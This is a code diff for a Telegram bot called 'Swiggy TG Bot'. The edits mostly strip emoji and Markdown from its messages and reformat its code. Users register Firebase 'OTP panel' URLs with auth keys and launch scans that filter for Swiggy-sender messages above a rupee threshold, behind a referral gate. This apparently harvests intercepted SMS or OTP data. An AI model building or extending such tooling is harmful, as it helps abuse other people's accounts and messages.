             await query.edit_message_text(
-                f"✅ *Channels joined!*
+                f"""Channels joined!
 
-"
-                f"🔗 *Step 2:* Share your referral link to unlock the bot.
+Step 2: Share your referral link to unlock the bot.
 
-"
-                f"📲 *Your Referral Link:*
-"
-                f"`{ref_link}`
+Your Referral Link:
+{ref_link}
 
-"
-                f"👥 Current referrals: `{refs}`
-"
-                f"Aur *{needed}* aur chahiye = 1 ghanta access
+Current referrals: {refs}
+{needed} more needed = 1 hour access
 
-"
-                f"💡 Har 3 referrals = 1 ghante ka access!",
-                parse_mode="Markdown",
+Every 3 referrals = 1 hour access!""",
             )
         else:
-            await query.edit_message_text(
-                "✅ *Sab channels join ho gaye! Welcome!*",
-                parse_mode="Markdown",
-            )
+            await query.edit_message_text("All channels joined! Welcome!")
             await show_main_menu(update, context)
+
 
 # ── Start Scan ─────────────────────────────────────────────────────────────────
 async def start_scan(update: Update, context: ContextTypes.DEFAULT_TYPE):
     uid = update.effective_user.id
 
     if uid not in ADMIN_IDS and not has_access(uid):
-        await update.message.reply_text("⛔ Access expired. Share your referral link to unlock!")
+        await update.message.reply_text(
+            "Access expired. Share your referral link to unlock!"
+        )
         return
 
     my_panels = get_user_panels(uid)
     if not my_panels:
         await update.message.reply_text(
-            "❌ *Tumhare paas koi panel nahi hai!*
+            """You have no panels!
 
-"
-            "➕ *Add My Panel* dabao aur apna Firebase panel link add karo.
-"
-            "Sirf tumhare panels use honge — koi aur nahi.",
-            parse_mode="Markdown",
+Tap "Add My Panel" and add your Firebase panel link.
+Only YOUR panels will be used - nobody else can access them.""",
         )
         return
 
     us = await session_manager.get(uid)
     if us.is_running:
-        await update.message.reply_text("⚠️ Scan already running! Use ⏹ Stop Scan first.")
+        await update.message.reply_text(
+            "Scan already running! Use Stop Scan first."
+        )
         return
 
-    # Show panel selector
+    # Auto-select if only one panel
     if len(my_panels) == 1:
         pk = list(my_panels.keys())[0]
         context.user_data["selected_panel"] = pk
         await update.message.reply_text(
-            f"✅ Panel auto-selected: *{my_panels[pk].get('name', 'Unknown')}*
+            f"""Panel auto-selected: {my_panels[pk].get('name', 'Unknown')}
 
-"
-            f"Send settings:
-"
-            f"`threshold campaign_id sender`
+Send settings:
+threshold campaign_id sender
 
-"
-            f"Example: `190 {DEFAULT_CAMPAIGN_ID} SWIGGY`
+Example: 190 {DEFAULT_CAMPAIGN_ID} SWIGGY
 
-"
-            f"Or just send `default` for defaults",
-            parse_mode="Markdown",
+Or just send "default" for defaults""",
         )
         context.user_data["awaiting_scan_settings"] = True
         return
 
+    # Multiple panels — show inline keyboard
     buttons = []
     for pk, pc in my_panels.items():
-        buttons.append([InlineKeyboardButton(pc.get("name", "Unknown"), callback_data=f"panel_{pk}")])
+        buttons.append(
+            [InlineKeyboardButton(pc.get("name", "Unknown"), callback_data=f"panel_{pk}")]
+        )
     await update.message.reply_text(
-        "📋 *Select YOUR panel to scan:*",
-        parse_mode="Markdown",
+        "Select YOUR panel to scan:",
         reply_markup=InlineKeyboardMarkup(buttons),
     )
+
 
 async def panel_selected_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
     query = update.callback_query
@@ -1122,26 +1145,22 @@ async def panel_selected_callback(update: Update, context: ContextTypes.DEFAULT_
     pk = data[6:]
     my_panels = get_user_panels(uid)
     if pk not in my_panels:
-        await query.edit_message_text("❌ Panel not found.")
+        await query.edit_message_text("Panel not found.")
         return
 
     context.user_data["selected_panel"] = pk
     await query.edit_message_text(
-        f"✅ Selected: *{my_panels[pk].get('name', 'Unknown')}*
+        f"""Selected: {my_panels[pk].get('name', 'Unknown')}
 
-"
-        f"Send settings:
-"
-        f"`threshold campaign_id sender`
+Send settings:
+threshold campaign_id sender
 
-"
-        f"Example: `190 {DEFAULT_CAMPAIGN_ID} SWIGGY`
+Example: 190 {DEFAULT_CAMPAIGN_ID} SWIGGY
 
-"
-        f"Or just send `default` for defaults",
-        parse_mode="Markdown",
+Or just send "default" for defaults""",
     )
     context.user_data["awaiting_scan_settings"] = True
+
 
 # ── Stop Scan ──────────────────────────────────────────────────────────────────
 async def stop_scan(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -1149,7 +1168,7 @@ async def stop_scan(update: Update, context: ContextTypes.DEFAULT_TYPE):
     us = await session_manager.get(uid)
 
     if not us.is_running:
-        await update.message.reply_text("ℹ️ No scan running.")
+        await update.message.reply_text("No scan running.")
         return
 
     for task_id, task in list(us.running_tasks.items()):
@@ -1158,44 +1177,34 @@ async def stop_scan(update: Update, context: ContextTypes.DEFAULT_TYPE):
     us.is_running = False
 
     await update.message.reply_text(
-        f"⏹ *Scan Stopped!*
-"
-        f"📱 Scanned: {us.total_scanned}
-"
-        f"✅ Found: {us.total_found}",
-        parse_mode="Markdown",
+        f"""Scan Stopped!
+Scanned: {us.total_scanned}
+Found: {us.total_found}"""
     )
+
 
 # ── Add My Panel ───────────────────────────────────────────────────────────────
 async def handle_add_my_panel(update: Update, context: ContextTypes.DEFAULT_TYPE):
     uid = update.effective_user.id
 
     if uid not in ADMIN_IDS and not has_access(uid):
-        await update.message.reply_text("⛔ Access expired. Share your referral link to unlock!")
+        await update.message.reply_text("Access expired. Share your referral link to unlock!")
         return
 
     await update.message.reply_text(
-        "➕ *Add YOUR Panel*
+        """Add YOUR Panel
 
-"
-        "Apna Firebase panel link bhejo:
-"
-        "• Raw: `https://xxx-default-rtdb.firebaseio.com`
-"
-        "• With auth: `https://xxx.firebaseio.com?auth=KEY`
-"
-        "• Encoded: `https://panel.site/?s=...`
-"
-        "• Merge: `https://free-otp-panel.vercel.app/#merge=...`
+Send your Firebase panel link:
+- Raw: https://xxx-default-rtdb.firebaseio.com
+- With auth: https://xxx.firebaseio.com?auth=KEY
+- Encoded: https://panel.site/?s=...
+- Merge: https://free-otp-panel.vercel.app/#merge=...
 
-"
-        "🔒 *Sirf tumhara panel hai — koi aur use nahi karega.*
-
-"
-        "Multiple links = one per line",
-        parse_mode="Markdown",
+Only YOUR panel - nobody else can use it.
+Multiple links = one per line""",
     )
     context.user_data["awaiting_add_my_panel"] = True
+
 
 # ── Remove My Panel ────────────────────────────────────────────────────────────
 async def handle_remove_my_panel(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -1203,23 +1212,21 @@ async def handle_remove_my_panel(update: Update, context: ContextTypes.DEFAULT_T
     my_panels = get_user_panels(uid)
 
     if not my_panels:
-        await update.message.reply_text("❌ Tumhare paas koi panel nahi hai.")
+        await update.message.reply_text("You have no panels.")
         return
 
-    text = "❌ *Remove YOUR Panel*
-
-"
+    lines = ["Remove YOUR Panel", ""]
     plist = []
     for i, (pk, pc) in enumerate(my_panels.items(), 1):
-        text += f"{i}. {pc.get('name')}
-"
+        lines.append(f"{i}. {pc.get('name')}")
         plist.append(pk)
-    text += "
+    lines.append("")
+    lines.append("Send number to remove.")
 
-Send number to remove."
     context.user_data["awaiting_remove_my_panel"] = True
     context.user_data["my_panels_list"] = plist
-    await update.message.reply_text(text, parse_mode="Markdown")
+    await update.message.reply_text("\n".join(lines))
+
 
 # ── My Panels ──────────────────────────────────────────────────────────────────
 async def my_panels_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -1228,26 +1235,22 @@ async def my_panels_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
     if not my_panels:
         await update.message.reply_text(
-            "❌ *Koi panel nahi hai.*
+            """You have no panels.
 
-"
-            "➕ *Add My Panel* dabao aur apna link add karo.",
-            parse_mode="Markdown",
+Tap "Add My Panel" to add your link.""",
         )
         return
 
-    text = "📋 *Your Panels*
-━━━━━━━━━━━━━━━━━━━━━━
-
-"
+    lines = ["Your Panels", "====================", ""]
     for i, (pk, pc) in enumerate(my_panels.items(), 1):
         api_url = pc.get("api_url", "")[:45]
-        text += f"*{i}. {pc.get('name')}*
-  API: `{api_url}...`
+        lines.append(f"{i}. {pc.get('name')}")
+        lines.append(f"   API: {api_url}...")
+        lines.append("")
+    lines.append("These are PRIVATE - nobody else can see them.")
 
-"
-    text += "🔒 Yeh sirf tumhare hain — koi aur nahi dekh sakta."
-    await update.message.reply_text(text, parse_mode="Markdown")
+    await update.message.reply_text("\n".join(lines))
+
 
 # ── My Status ──────────────────────────────────────────────────────────────────
 async def my_status_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -1255,27 +1258,20 @@ async def my_status_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     us = await session_manager.get(uid)
     my_panels = get_user_panels(uid)
 
-    text = (
-        f"📊 *Your Status*
-"
-        f"━━━━━━━━━━━━━━━━━━━━━━
-"
-        f"📦 Your Panels: {len(my_panels)}
-"
-        f"🔄 Scan Running: {'✅ Yes' if us.is_running else '❌ No'}
-"
-    )
+    lines = [
+        "Your Status",
+        "====================",
+        f"Your Panels: {len(my_panels)}",
+        f"Scan Running: {'Yes' if us.is_running else 'No'}",
+    ]
     if us.is_running:
-        text += (
-            f"📱 Scanned: {us.total_scanned}
-"
-            f"✅ Found: {us.total_found}
-"
-            f"🧵 Workers: {DEFAULT_WORKERS}
-"
-        )
-    text += f"━━━━━━━━━━━━━━━━━━━━━━"
-    await update.message.reply_text(text, parse_mode="Markdown")
+        lines.append(f"Scanned: {us.total_scanned}")
+        lines.append(f"Found: {us.total_found}")
+        lines.append(f"Workers: {DEFAULT_WORKERS}")
+    lines.append("====================")
+
+    await update.message.reply_text("\n".join(lines))
+
 
 # ── My Referral ────────────────────────────────────────────────────────────────
 async def my_referral_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -1287,30 +1283,24 @@ async def my_referral_command(update: Update, context: ContextTypes.DEFAULT_TYPE
     next_milestone = REFERRALS_FOR_1H - (refs % REFERRALS_FOR_1H)
 
     await update.message.reply_text(
-        f"🔗 *Your Referral*
-"
-        f"━━━━━━━━━━━━━━━━━━━━━━
-"
-        f"Total: *{refs}*
-"
-        f"Next 1h access in: *{next_milestone}* more referral(s)
+        f"""Your Referral
+====================
+Total: {refs}
+Next 1h access in: {next_milestone} more referral(s)
 
-"
-        f"📲 Link:
-`{ref_link}`
+Your Link:
+{ref_link}
 
-"
-        f"ℹ️ Har 3 referrals = 1 ghante ka access!
-"
-        f"Share karo aur bot unlock karo 🚀",
-        parse_mode="Markdown",
+Every 3 referrals = 1 hour access!
+Share and unlock the bot!""",
     )
+
 
 # ── My Access ──────────────────────────────────────────────────────────────────
 async def my_access_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     uid = update.effective_user.id
     if uid in ADMIN_IDS:
-        await update.message.reply_text("♾ *Admin — Unlimited access!*", parse_mode="Markdown")
+        await update.message.reply_text("Admin - Unlimited access!")
         return
     u = get_user(uid)
     expiry = u.get("access_expiry", 0) if u else 0
@@ -1321,28 +1311,21 @@ async def my_access_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
         mins = rem // 60
         exp_str = datetime.fromtimestamp(expiry).strftime("%H:%M %d/%m/%Y")
         await update.message.reply_text(
-            f"✅ *Access Active*
-"
-            f"Expires: `{exp_str}`
-"
-            f"Remaining: `{hours}h {mins}m`
-"
-            f"Referrals: `{refs}`",
-            parse_mode="Markdown",
+            f"""Access Active
+Expires: {exp_str}
+Remaining: {hours}h {mins}m
+Referrals: {refs}""",
         )
     else:
         needed = REFERRALS_FOR_1H - (refs % REFERRALS_FOR_1H)
         await update.message.reply_text(
-            f"⛔ *No Access*
-"
-            f"Referrals: `{refs}`
-"
-            f"Aur *{needed}* more = 1 ghanta access
+            f"""No Access
+Referrals: {refs}
+{needed} more = 1 hour access
 
-"
-            f"🔗 Use /start to get your referral link",
-            parse_mode="Markdown",
+Use /start to get your referral link""",
         )
+
 
 # ── Text message router ───────────────────────────────────────────────────────
 async def handle_text_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -1354,7 +1337,7 @@ async def handle_text_message(update: Update, context: ContextTypes.DEFAULT_TYPE
         context.user_data.pop("awaiting_scan_settings")
         panel_key = context.user_data.get("selected_panel")
         if not panel_key:
-            await update.message.reply_text("❌ Panel not selected. Try again.")
+            await update.message.reply_text("Panel not selected. Try again.")
             return
 
         if text.lower() == "default":
@@ -1375,8 +1358,7 @@ async def handle_text_message(update: Update, context: ContextTypes.DEFAULT_TYPE
                     sender = parts[2]
             except ValueError:
                 await update.message.reply_text(
-                    "❌ Invalid format. Use: `threshold campaign_id sender` or `default`",
-                    parse_mode="Markdown",
+                    'Invalid format. Use: threshold campaign_id sender\nOr just send "default"'
                 )
                 return
 
@@ -1384,20 +1366,13 @@ async def handle_text_message(update: Update, context: ContextTypes.DEFAULT_TYPE
             run_scraper(uid, context.application, panel_key, sender, campaign_id, threshold)
         )
         await update.message.reply_text(
-            f"🚀 *Scan Started!*
+            f"""Scan Started!
+Threshold: Rs {threshold}
+Campaign: {campaign_id}
+Sender: {sender}
+Workers: {DEFAULT_WORKERS}
 
-"
-            f"Threshold: ₹{threshold}
-"
-            f"Campaign: `{campaign_id}`
-"
-            f"Sender: {sender}
-"
-            f"Workers: {DEFAULT_WORKERS}
-
-"
-            f"You'll get progress updates. Use ⏹ Stop Scan to cancel.",
-            parse_mode="Markdown",
+You'll get progress updates. Use Stop Scan to cancel.""",
         )
         return
 
@@ -1405,19 +1380,20 @@ async def handle_text_message(update: Update, context: ContextTypes.DEFAULT_TYPE
     if context.user_data.get("awaiting_add_my_panel"):
         context.user_data.pop("awaiting_add_my_panel")
         if uid not in ADMIN_IDS and not has_access(uid):
-            await update.message.reply_text("⛔ Access expired!")
+            await update.message.reply_text("Access expired!")
             return
 
-        links = [line.strip() for line in text.split("
-") if line.strip()]
+        links = [line.strip() for line in text.split("\n") if line.strip()]
         if not links:
-            await update.message.reply_text("❌ Link nahi mila.")
+            await update.message.reply_text("No link found.")
             return
 
         added = 0
         failed = []
         my_panels = get_user_panels(uid)
-        existing_urls = {pc.get("api_url", "").rstrip("/").lower() for pc in my_panels.values()}
+        existing_urls = {
+            pc.get("api_url", "").rstrip("/").lower() for pc in my_panels.values()
+        }
 
         for link in links:
             if not link.startswith("http"):
@@ -1427,7 +1403,7 @@ async def handle_text_message(update: Update, context: ContextTypes.DEFAULT_TYPE
                     failed.append(link[:40])
                     continue
 
-            # Merge URL — expand to multiple panels
+            # Merge URL
             parsed_link = urllib.parse.urlparse(link)
             if parsed_link.fragment.startswith("merge="):
                 merge_list = decode_merge_panels(link)
@@ -1437,14 +1413,17 @@ async def handle_text_message(update: Update, context: ContextTypes.DEFAULT_TYPE
                 for api_url, auth_key in merge_list:
                     normalised = api_url.rstrip("/").lower()
                     if normalised in existing_urls:
-                        continue  # skip dupes silently
-                    add_user_panel(uid, {
-                        "name": f"Panel {len(my_panels) + added + 1}",
-                        "api_url": api_url,
-                        "auth_key": auth_key,
-                        "panel_url": link,
-                        "added_date": datetime.now().strftime("%Y-%m-%d"),
-                    })
+                        continue
+                    add_user_panel(
+                        uid,
+                        {
+                            "name": f"Panel {len(my_panels) + added + 1}",
+                            "api_url": api_url,
+                            "auth_key": auth_key,
+                            "panel_url": link,
+                            "added_date": datetime.now().strftime("%Y-%m-%d"),
+                        },
+                    )
                     existing_urls.add(normalised)
                     added += 1
                 continue
@@ -1459,25 +1438,26 @@ async def handle_text_message(update: Update, context: ContextTypes.DEFAULT_TYPE
             if normalised in existing_urls:
                 continue
 
-            add_user_panel(uid, {
-                "name": f"Panel {len(my_panels) + added + 1}",
-                "api_url": api_url,
-                "auth_key": auth_key,
-                "panel_url": link,
-                "added_date": datetime.now().strftime("%Y-%m-%d"),
-            })
+            add_user_panel(
+                uid,
+                {
+                    "name": f"Panel {len(my_panels) + added + 1}",
+                    "api_url": api_url,
+                    "auth_key": auth_key,
+                    "panel_url": link,
+                    "added_date": datetime.now().strftime("%Y-%m-%d"),
+                },
+            )
             existing_urls.add(normalised)
             added += 1
 
-        msg = f"✅ *{added} panel(s) added to YOUR account!*"
+        msg = f"{added} panel(s) added to YOUR account!"
         if failed:
-            msg += f"
-❌ Failed ({len(failed)}):
-" + "
-".join(f"  • {f}" for f in failed)
-        msg += "
-🔒 Sirf tum use kar sakte ho — koi aur nahi."
-        await update.message.reply_text(msg, parse_mode="Markdown")
+            msg += f"\nFailed ({len(failed)}):"
+            for f_item in failed:
+                msg += f"\n  - {f_item}"
+        msg += "\nOnly YOU can use these - nobody else."
+        await update.message.reply_text(msg)
         return
 
     # ── Remove My Panel flow ──────────────────────────────────────────────────
@@ -1490,30 +1470,33 @@ async def handle_text_message(update: Update, context: ContextTypes.DEFAULT_TYPE
                 my_panels = get_user_panels(uid)
                 removed_name = my_panels.get(plist[idx], {}).get("name", "Unknown")
                 remove_user_panel(uid, plist[idx])
-                await update.message.reply_text(f"✅ Panel '{removed_name}' removed from your account!")
+                await update.message.reply_text(
+                    f"Panel '{removed_name}' removed from your account!"
+                )
             else:
-                await update.message.reply_text("❌ Wrong number!")
+                await update.message.reply_text("Wrong number!")
         except ValueError:
-            await update.message.reply_text("❌ Invalid input!")
+            await update.message.reply_text("Invalid input!")
         return
 
     # ── Menu button routing ───────────────────────────────────────────────────
-    if text in ("🔍 Start Scan", "Start Scan"):
+    if text in ("Start Scan",):
         await start_scan(update, context)
-    elif text in ("⏹ Stop Scan", "Stop Scan"):
+    elif text in ("Stop Scan",):
         await stop_scan(update, context)
-    elif text in ("➕ Add My Panel", "Add My Panel"):
+    elif text in ("Add My Panel",):
         await handle_add_my_panel(update, context)
-    elif text in ("❌ Remove My Panel", "Remove My Panel"):
+    elif text in ("Remove My Panel",):
         await handle_remove_my_panel(update, context)
-    elif text in ("📋 My Panels", "My Panels"):
+    elif text in ("My Panels",):
         await my_panels_command(update, context)
-    elif text in ("📊 My Status", "My Status"):
+    elif text in ("My Status",):
         await my_status_command(update, context)
-    elif text in ("🔗 My Referral", "My Referral"):
+    elif text in ("My Referral",):
         await my_referral_command(update, context)
-    elif text in ("⏳ My Access", "My Access"):
+    elif text in ("My Access",):
         await my_access_command(update, context)
+
 
 # ── Main ───────────────────────────────────────────────────────────────────────
 async def main():
@@ -1524,17 +1507,24 @@ async def main():
     application = Application.builder().token(BOT_TOKEN).build()
 
     application.add_handler(CommandHandler("start", start_command))
-    application.add_handler(CallbackQueryHandler(check_join_callback, pattern="^check_join$"))
-    application.add_handler(CallbackQueryHandler(panel_selected_callback, pattern="^panel_"))
-    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_text_message))
+    application.add_handler(
+        CallbackQueryHandler(check_join_callback, pattern="^check_join$")
+    )
+    application.add_handler(
+        CallbackQueryHandler(panel_selected_callback, pattern="^panel_")
+    )
+    application.add_handler(
+        MessageHandler(filters.TEXT & ~filters.COMMAND, handle_text_message)
+    )
 
-    logger.info("🛒 Swiggy TG Bot (Private Panels) starting...")
+    logger.info("Swiggy TG Bot (Private Panels) starting...")
     async with application:
         await application.initialize()
         await application.start()
         await application.updater.start_polling(allowed_updates=Update.ALL_TYPES)
         while True:
             await asyncio.sleep(1)
+
 
 if __name__ == "__main__":
     try:
